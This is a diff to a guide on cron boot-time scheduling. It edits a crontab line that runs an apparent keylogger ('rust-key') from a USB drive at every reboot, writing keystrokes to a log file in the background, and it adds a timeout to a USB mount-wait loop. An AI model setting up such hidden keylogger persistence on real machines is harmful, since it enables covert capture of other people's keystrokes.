@@ -136,7 +136,7 @@ sudo crontab -e
 ### Example 2: Boot Startup with Log File on USB
 
 ```bash
-@reboot sleep 30 && cd /run/media/user/MYUSB && nohup /run/media/user/MYUSB/rust-key > /run/media/user/MYUSB/logs/keylog.txt 2>&1 &
+@reboot sleep 30 && /run/media/user/MYUSB/rust-key > /run/media/user/MYUSB/logs/keylog.txt 2>&1 &
 ```
 
 ### Example 3: Scheduled Monitoring During Work Hours
@@ -246,11 +246,13 @@ If your script depends on a USB drive, add a delay:
 @reboot sleep 30 && /run/media/user/USB/usb_autorun.sh
 ```
 
-Or check for mount point before executing:
+Or check for mount point before executing (with timeout):
 
 ```bash
-@reboot /bin/bash -c 'while [ ! -d /run/media/user/USB ]; do sleep 1; done; /run/media/user/USB/usb_autorun.sh'
+@reboot /bin/bash -c 'count=0; while [ ! -d /run/media/user/USB ] && [ $count -lt 60 ]; do sleep 1; count=$((count+1)); done; [ -d /run/media/user/USB ] && /run/media/user/USB/usb_autorun.sh'
 ```
+
+This will wait up to 60 seconds for the USB drive to mount.
 
 ## Security Best Practices
 
